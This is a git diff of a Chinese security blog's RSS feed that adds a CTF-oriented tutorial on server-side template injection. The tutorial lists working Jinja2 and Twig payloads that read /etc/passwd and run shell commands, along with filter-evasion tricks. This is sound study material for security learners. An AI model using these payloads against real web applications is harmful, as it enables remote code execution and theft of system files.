@@ -5,24 +5,251 @@
         <link>http://example.com</link>
         <description>学习博客</description>
         <language>zh-CN</language>
-        <pubDate>Sat, 23 Oct 2021 10:44:00 +0800</pubDate>
-        <lastBuildDate>Sat, 23 Oct 2021 10:44:00 +0800</lastBuildDate>
+        <pubDate>Tue, 23 Nov 2021 19:57:15 +0800</pubDate>
+        <lastBuildDate>Tue, 23 Nov 2021 19:57:15 +0800</lastBuildDate>
         <category>随笔</category>
         <category>SSTI</category>
         <category>反序列化</category>
-        <category>命令执行</category>
         <category>http</category>
         <category>代码审计</category>
+        <category>命令执行</category>
         <category>sql</category>
         <category>SSRF</category>
-        <category>反序列化2</category>
-        <category>文件包含</category>
         <category>upload</category>
+        <category>反序列化2</category>
         <category>业余爱好</category>
+        <category>文件包含</category>
         <category>RCE</category>
         <category>php</category>
         <category>python</category>
         <category>yeah</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2021/11/23/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid>
+            <title>ctfweb-SSTI服务器模板注入</title>
+            <link>http://example.com/2021/11/23/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link>
+            <category>SSTI</category>
+            <pubDate>Tue, 23 Nov 2021 19:57:15 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述&#34;&gt;#&lt;/a&gt; 概述&lt;/h2&gt;
+&lt;p&gt;模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在考虑进行模板注入之前，我们需要进行漏洞探测&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;探测漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测漏洞&#34;&gt;#&lt;/a&gt; 探测漏洞&lt;/h2&gt;
+&lt;h3 id=&#34;1文本类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1文本类&#34;&gt;#&lt;/a&gt; 1. 文本类&lt;/h3&gt;
+&lt;p&gt;大部分的模板语言支持我们输入 HTML，未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。&lt;/p&gt;
+&lt;p&gt;例如，考虑一个包含以下易受攻击的代码的模板：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;render(&#39;Hello &#39; + username)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们可以发送如下 payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;7*7&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;或者通过请求 URL 来测试服务器端模板的注入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?username=$&amp;#123;7*7&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果结果输出包含 &lt;code&gt;Hello 49&lt;/code&gt; ，则表明正在服务器端评估数学运算。这是服务器端模板注入漏洞的良好概念证明。&lt;/p&gt;
+&lt;h3 id=&#34;2代码类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2代码类&#34;&gt;#&lt;/a&gt; 2. 代码类&lt;/h3&gt;
+&lt;p&gt;在一些环境下，用户的输入也会被当作模板的可执行代码。&lt;/p&gt;
+&lt;p&gt;这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的 HTML 标签以确认漏洞：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?greeting=data.username
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在没有 XSS 的情况下，这通常会导致输出中出现空白条目（只是&lt;strong&gt; Hello&lt;/strong&gt; 没有用户名），编码标签或错误消息。&lt;/p&gt;
+&lt;p&gt;下一步是尝试使用通用模板语法突破该语句，并尝试在其后注入任意 HTML：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?greeting=data.username&amp;#125;&amp;#125;&amp;lt;tag&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果再次导致错误或空白输出，则说明使用了错误的模板语言提供的语法，或者，如果没有模板样式的语法似乎有效，则无法进行服务器端模板注入。&lt;/p&gt;
+&lt;p&gt;或者，如果输出和任意 HTML 一起正确呈现，则表明存在服务器端模板注入漏洞：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Hello user01 &amp;lt;tag&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;确认模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#确认模板&#34;&gt;#&lt;/a&gt; 确认模板&lt;/h2&gt;
+&lt;p&gt;一旦检测到模板注入潜力，下一步就是确定模板引擎。&lt;/p&gt;
+&lt;p&gt;尽管有大量的模板语言，但是其中许多模板使用非常相似的语法，而这些语法是专门为不与 HTML 字符冲突而选择的。&lt;/p&gt;
+&lt;p&gt;通常只需提交无效的语法就足够了，因为产生的错误消息将准确告诉您模板引擎是什么，有时甚至是哪个版本。例如，无效表达式 &lt;code&gt;&amp;lt;%=foobar%&amp;gt;&lt;/code&gt;  从基于 Ruby 的 ERB 引擎触发以下响应：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(erb):1:in `&amp;lt;main&amp;gt;&#39;: undefined local variable or method `foobar&#39; for main:Object (NameError)
+from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval&#39;
+from /usr/lib/ruby/2.5.0/erb.rb:876:in `result&#39;
+from -e:4:in `&amp;lt;main&amp;gt;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;否则，需要手动测试特定于语言的不同有效负载，根据不同的运算值判断模板。常用的方法是使用来自不同模板引擎的语法注入任意数学运算。&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9waWM0LnpoaW1nLmNvbS84MC92Mi0zMzIxZjQ2ODU5YzBiZTllOTNmOWFkNzlmM2RkMWNkM18xNDQwdy5qcGc=&#34;&gt;https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg&lt;/span&gt;&amp;quot;alt=&amp;quot; 决策树 &amp;quot;style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;这里的绿线表示结果成功返回，红线反之。&lt;/p&gt;
+&lt;p&gt;相同的有效负载有时可能会以一种以上的模板语言返回成功的响应。例如有效负载 &lt;code&gt;&amp;#123; &amp;#123;7*&#39;7&#39;&amp;#125; &amp;#125;&lt;/code&gt;  在 Twig 中返回&lt;strong&gt; 49&lt;/strong&gt;，在 Jinja2 中返回&lt;strong&gt; 7777777&lt;/strong&gt;。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h2&gt;
+&lt;h3 id=&#34;1读文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1读文档&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 读文档&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&#39;Template 使用手册 &#39;，这一部分通常告诉我们基本的模板语法&lt;/li&gt;
+&lt;li&gt;&#39; 安全问题 &#39;，在攻击模板时，它通常可以提供我们许多思路&lt;/li&gt;
+&lt;li&gt;内建方法，函数，变量，过滤器&lt;/li&gt;
+&lt;li&gt;插件 / 扩展 —— 我们可以优先研究默认开启的&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2探环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2探环境&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 探环境&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数 / 对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。&lt;/p&gt;
+&lt;p&gt;如果没有这样的对象或函数，我们需要暴力枚举变量名。&lt;/p&gt;
+&lt;p&gt;有些时候，开发者也会在模板中包含了一些敏感信息。不过这视情况而定，因此不在这里讨论。&lt;/p&gt;
+&lt;h3 id=&#34;3黑程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3黑程序&#34;&gt;#&lt;/a&gt; 3.&lt;strong&gt; 黑程序&lt;/strong&gt;&lt;/h3&gt;
+&lt;p php&gt;有些时候，攻破一个程序不需要多少时间，比如：{php} echo id;&lt;/p&gt;
+&lt;p&gt;这时，我们只需递交：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;%
+import os
+x=os.popen(&#39;id&#39;).read()
+%&amp;gt;
+$&amp;#123;x&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;即可&lt;/p&gt;
+&lt;p&gt;但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。&lt;/p&gt;
+&lt;h2 id=&#34;常见模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见模板&#34;&gt;#&lt;/a&gt; 常见模板&lt;/h2&gt;
+&lt;p&gt;下图为&lt;strong&gt;常见模板结构&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwODAzMTA0NjU3MjM3LnBuZw==&#34;&gt;https://img-blog.csdnimg.cn/20200803104657237.png&lt;/span&gt;&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;h3 id=&#34;1jinja2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1jinja2&#34;&gt;#&lt;/a&gt; 1.jinja2&lt;/h3&gt;
+&lt;h4 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;常用函数&lt;/strong&gt;&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;__dict__            保存类实例或对象实例的属性变量键值对字典
+__class__           返回类型所属的对象(返回调用的参数类型)
+__mro__             返回一个包含对象所继承的基类元组(返回类型列表)，方法在解析时按照元组的顺序解析。
+__bases__           返回该对象所继承的基类
+// __base__和__mro__都是用来寻找基类的
+
+__subclasses__      每个新类都保留了子类的引用(返回object的子类)，这个方法返回一个类中仍然可用的的引用的列表
+__init__            类的初始化方法
+__globals__         对包含函数全局变量的字典的引用
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload&lt;/h4&gt;
+&lt;p&gt;获取基本类&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39;&#39;.__class__.__mro__[2]
+&amp;#123;&amp;#125;.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;获取基本类后，继续向下获取基本类 (object) 的子类&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;object.__subclasses__()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;存在的子模块可以通过.index () 来进行查询，如果存在的话返回索引，直接调用即可&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39;&#39;.__class__.__mro__[2].__subclasses__().index(file)
+40
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后通过.read 读取文件即可（py2）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() #将read() 修改为 write() 即为写文件
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;payload总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload总结&#34;&gt;#&lt;/a&gt; &lt;strong&gt;payload 总结&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;python2&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/etc/passwd&#39;).read()&amp;#125; &amp;#125;                             //文件读取
+
+&amp;#123; &amp;#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()&amp;#125; &amp;#125;              //文件读取
+
+&amp;#123; &amp;#123;()[&amp;quot;\x5F\x5Fclass\x5F\x5F&amp;quot;][&amp;quot;\x5F\x5Fbases\x5F\x5F&amp;quot;][0][&amp;quot;\x5F\x5Fsubclasses\x5F\x5F&amp;quot;]()[91][&amp;quot;get\x5Fdata&amp;quot;](0, &amp;quot;app\x2Epy&amp;quot;)&amp;#125; &amp;#125;                                    
+
+&amp;#123; &amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&amp;quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&amp;quot;)&amp;#125; &amp;#125;               //命令执行
+
+&amp;#123; &amp;#123;()[&amp;quot;\x5F\x5Fclass\x5F\x5F&amp;quot;][&amp;quot;\x5F\x5Fbases\x5F\x5F&amp;quot;][0][&amp;quot;\x5F\x5Fsubclasses\x5F\x5F&amp;quot;]()[80][&amp;quot;load\x5Fmodule&amp;quot;](&amp;quot;os&amp;quot;)[&amp;quot;system&amp;quot;](&amp;quot;ls&amp;quot;)&amp;#125; &amp;#125;
+
+&amp;#123; &amp;#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()&amp;#125; &amp;#125;                               //命令执行
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;python3&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//命令执行
+&amp;#123; % for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123; &amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&amp;quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&amp;quot;) &amp;#125; &amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
+//文件操作
+&amp;#123; % for c in [].__class__.__base__.__subclasses__() % &amp;#125;&amp;#123; % if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123; &amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &amp;#125; &amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;拼接查找目录&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; % for c in [].__class__.__base__.__subclasses__() % &amp;#125;&amp;#123; % if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123; &amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125; &amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查找根目录 -------------------------------&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; % for c in [].__class__.__base__.__subclasses__() % &amp;#125;&amp;#123; % if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;)&amp;#125;&amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;开头的都是 class 什么的，说明是 python3 写的 flask。因为 py2 写的话，开头的都是 type。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;python2 下有 file 而在 python3 下已经没有了，所以是直接用 open。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;更详细的方法查看参考链接第五条    &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==&#34;&gt;浅析 SSTI (python 沙盒绕过)&lt;/span&gt;&lt;/p&gt;
+&lt;h4 id=&#34;常见绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见绕过&#34;&gt;#&lt;/a&gt; &lt;strong&gt;常见绕过&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;1. 绕过中括号&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;pop () 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在这里使用 pop 并不会真的移除，但却能返回其值，取代中括号，来实现绕过。&lt;/p&gt;
+&lt;p&gt;​		&lt;em&gt;&lt;strong&gt;2. 过滤引号&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;request.args&lt;/code&gt;  是 flask 中的一个属性，为返回请求的参数，这里把 &lt;code&gt;path&lt;/code&gt;  当作变量名，将后面的路径传值进来，进而绕过了引号的过滤&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&amp;#125; &amp;#125;&amp;amp;pat
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;3. 过滤&lt;/strong&gt;&lt;/em&gt; { {&lt;em&gt;&lt;strong&gt;或者&lt;/strong&gt;&lt;/em&gt;}  }&lt;/p&gt;
+&lt;p&gt;可以使用 { % 绕过，&lt;br&gt;
+ &lt;code&gt;&amp;#123; %  % &amp;#125;&lt;/code&gt;  中间可以执行 if 语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; % if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/tmp/test&#39;).read()[0:1]==&#39;p&#39; % &amp;#125;1&amp;#123; % endif % &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;​	&lt;strong&gt;4. 过滤_&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;用编码绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__class__ =&amp;gt; \x5f\x5fclass\x5f\x5f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;_ 是 \x5f，. 是 \x2E      如果也过滤了&lt;/p&gt;
+&lt;p&gt;可以用利用 &lt;code&gt;request.args&lt;/code&gt;  属性&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; &amp;#123; &amp;#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;/etc/passwd&#39;).read() &amp;#125; &amp;#125;&amp;amp;class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将其中的 &lt;code&gt;request.args&lt;/code&gt;  改为 &lt;code&gt;request.values&lt;/code&gt;  则利用 post 的方式进行传参&lt;/p&gt;
+&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;5. 过滤.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;. 在 payload 中是很重要的，但是我们依旧可以采用 attr () 绕过&lt;br&gt;
+举例&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;url?name=&amp;#123; &amp;#123;().__class__.__base__.__subclasses__[177].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;ipconfig&amp;quot;).read()&#39;)&amp;#125; &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用 attr () 绕过：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)|attr(&#39;__subclasses__&#39;)()|attr(&#39;__getitem__&#39;)(177)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)(&#39;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;dir&amp;quot;).read()&#39;)&amp;#125; &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;6. 绕过 config 参数&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;#123; &amp;#123;config&amp;#125; &amp;#125;&lt;/code&gt;  可以获取当前设置，如果题目类似&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那可以直接访问&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;config[&#39;FLAG&#39;]&amp;#125; &amp;#125;   或者   &amp;#123; &amp;#123;config.FLAG&amp;#125; &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到 flag。但是如果被过滤了，则&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;self&amp;#125; &amp;#125; ⇒ &amp;lt;TemplateReference None&amp;gt;
+&amp;#123; &amp;#123;self.__dict__._TemplateReference__context.config&amp;#125; &amp;#125; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;同样可以找到 config&lt;/p&gt;
+&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;7. 关键字过滤&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;base64 编码绕过&lt;br&gt;
+ &lt;code&gt;__getattribute__&lt;/code&gt; 使用实例访问属性时，调用该方法&lt;/p&gt;
+&lt;p&gt;例如被过滤掉 &lt;code&gt;__class__&lt;/code&gt; 关键词&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&amp;quot;/etc/passwd&amp;quot;).read()&amp;#125; &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;字符串拼接绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&amp;quot;/etc/passwd&amp;quot;).read()&amp;#125; &amp;#125; 
+//不对就加join
+
+&amp;#123; &amp;#123;[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[40]&amp;#125; &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;2smarty&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2smarty&#34;&gt;#&lt;/a&gt; 2.smarty&lt;/h3&gt;
+&lt;p&gt;Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用  system ()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 $smarty 来获取许多环境变量（比如当前变量的位置  $SCRIPT_NAME)。&lt;/p&gt;
+&lt;p&gt;参考文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lYjhkMDEzN2E3ZDM=&#34;&gt;ctf 中 smarty 介绍与例题&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;smarty，应用比较少。&lt;/p&gt;
+&lt;h3 id=&#34;3twig&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3twig&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3.twig&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;文件读取&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;&#39;/etc/passwd&#39;|file_excerpt(1,30)&amp;#125; &amp;#125;
+
+&amp;#123; &amp;#123;app.request.files.get(1).__construct(&#39;/etc/passwd&#39;,&#39;&#39;)&amp;#125; &amp;#125;
+&amp;#123; &amp;#123;app.request.files.get(1).openFile.fread(99)&amp;#125; &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;rce&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)&amp;#125; &amp;#125;&amp;#123; &amp;#123;_self.env.getFilter(&amp;quot;id&amp;quot;)&amp;#125; &amp;#125;   （cat /flag ）
+
+&amp;#123; &amp;#123;[&#39;cat /etc/passwd&#39;]|filter(&#39;system&#39;)&amp;#125; &amp;#125;
+
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+&amp;#123; &amp;#123;app.request.query.filter(0,0,1024,&amp;#123;&#39;options&#39;:&#39;system&#39;&amp;#125;)&amp;#125; &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;4其他模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4其他模板&#34;&gt;#&lt;/a&gt; 4. 其他模板&lt;/h3&gt;
+&lt;p&gt;参考链接    &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==&#34;&gt;服务端模板注入攻击 - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;对各个模板有讲解&lt;/p&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==&#34;&gt;服务端模板注入攻击 - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI0NjgzMi5odG1s&#34;&gt;细说服务器端模板注入（SSTI） - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjAxNzUyMTFseXovcC8xMTQyNTM2OC5odG1s&#34;&gt;CTF SSTI (服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzE4Nzg0NS5odG1s&#34;&gt;从零学习 flask 模板注入&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRpL2FydGljbGUvZGV0YWlscy8xMDc3NTI3MTc=&#34;&gt;SSTI 模板注入及绕过姿势 (基于 Python-Jinja2)&lt;/span&gt;&lt;/p&gt;
